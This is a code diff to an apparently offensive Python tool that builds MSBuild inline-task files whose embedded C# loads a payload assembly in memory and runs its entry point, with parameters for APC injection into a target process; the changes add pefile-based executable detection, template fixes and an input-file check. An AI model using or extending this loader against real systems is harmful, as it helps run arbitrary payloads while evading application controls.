@@ -22,6 +22,7 @@ import sys
 import gzip
 import base64
 import string
+import pefile
 import struct
 import random
 import binascii
@@ -83,10 +84,16 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
       <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
         <![CDATA[       
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            using System;
+            using System.Diagnostics;
+            using System.Reflection;
+            using System.Runtime.InteropServices;
             using System.IO;
             using System.IO.Compression;
-            using System;
-            using System.Reflection;
             using System.Text;
 
             public class $templateName : Task {
@@ -113,14 +120,15 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
                     Assembly asm = Assembly.Load(payload);
                     MethodInfo method = asm.EntryPoint;
                     object instance = asm.CreateInstance(method.Name);
-                    method.Invoke(instance, null); 
+                    method.Invoke(instance, new object[] { new string[] { } }); 
                     return true;
                 }                                
             }           
         ]]>
       </Code>
     </Task>''').safe_substitute(
-            payloadCode = payloadCode
+            payloadCode = payloadCode,
+            templateName = templateName
         )
 
         launchCode = exeLaunchCode
@@ -143,7 +151,7 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
             using System.Runtime.InteropServices;
             using System.IO;
             using System.IO.Compression;
-           using System.Text;
+            using System.Text;
 
             public class $templateName : Task {
 
@@ -489,25 +497,11 @@ def getInlineTask(module, payload, _format, apc, targetProcess):
     return template
 
 def detectFileIsExe(filePath, forced = False):
-    first1000 = []
-
-    with open(filePath, 'rb') as f:
-        first1000 = f.read()[:1000]
-
-    if not (first1000[0] == 'M' and first1000[1] == 'Z'):
+    try:
+        pe = pefile.PE(filePath)
+        return True
+    except pefile.PEFormatError as e:
         return False
-
-    elfanew = struct.unpack('<H', first1000[0x3c:0x3c + 2])[0]
-
-    if not (first1000[elfanew + 0] == 'P' and first1000[elfanew + 1] == 'E'):
-        return False
-
-    dosStub = "This program cannot be run in DOS mode."
-    printables = ''.join([x for x in first1000[0x40:] if x in string.printable])
-
-    #if not dosStub in printables:
-    #    return False
-    return True
 
 def minimize(output):
     output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
@@ -600,6 +594,10 @@ def main(argv):
     args = opts(argv)
 
     _format = 'powershell'
+
+    if len(args.inputFile) > 0 and not os.path.isfile(args.inputFile):
+        sys.stderr.write('[?] Input file does not exists.\n\n')
+        return False
 
     if args.exe:
         if not detectFileIsExe(args.inputFile, args.exe):
